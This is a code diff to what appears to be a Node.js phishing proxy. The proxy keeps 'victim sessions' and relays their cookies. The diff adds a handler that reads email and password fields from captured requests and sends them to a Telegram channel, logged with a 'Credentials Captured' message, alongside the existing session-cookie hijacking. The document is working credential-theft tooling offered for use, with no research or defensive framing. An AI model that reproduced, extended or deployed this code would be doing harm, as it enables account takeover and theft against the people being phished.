@@ -282,13 +282,37 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 
                         if (clientRequestBody) {
                             if (url === PROXY_PATHNAMES.jsCookie) {
-                                updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [clientRequestBody], headers.host, currentSession);
-                                const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);
+    // ---- CHECK FOR CREDENTIALS PAYLOAD ----
+    let isCredentials = false;
+    let email = '';
+    let password = '';
+    try {
+        const parsed = JSON.parse(clientRequestBody);
+        if (parsed.type === 'credentials') {
+            isCredentials = true;
+            email = parsed.email || '';
+            password = parsed.password || '';
+        }
+    } catch (e) {}
 
-                                clientResponse.writeHead(200, { "Content-Type": "application/json" });
-                                clientResponse.end(JSON.stringify(validDomains));
-                                return;
-                            }
+    if (isCredentials && password) {
+        // Send to Telegram
+        const msg = `🔐 *Credentials Captured (DOM)*\n\n` +
+                    `📧 *Email:* ${email || 'N/A'}\n` +
+                    `🔑 *Password:* ${password}\n` +
+                    `🕐 *Time:* ${new Date().toISOString()}`;
+        sendToTelegram(msg).catch(e => console.error('Telegram send failed:', e));
+        console.log(`[TELEGRAM] DOM credentials for ${email || 'unknown'}`);
+    }
+
+    // ---- UPDATE COOKIES (original) ----
+    updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [clientRequestBody], headers.host, currentSession);
+    const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);
+
+    clientResponse.writeHead(200, { "Content-Type": "application/json" });
+    clientResponse.end(JSON.stringify(validDomains));
+    return;
+}
 
                             else if (url === PROXY_PATHNAMES.proxy) {
                                 try {
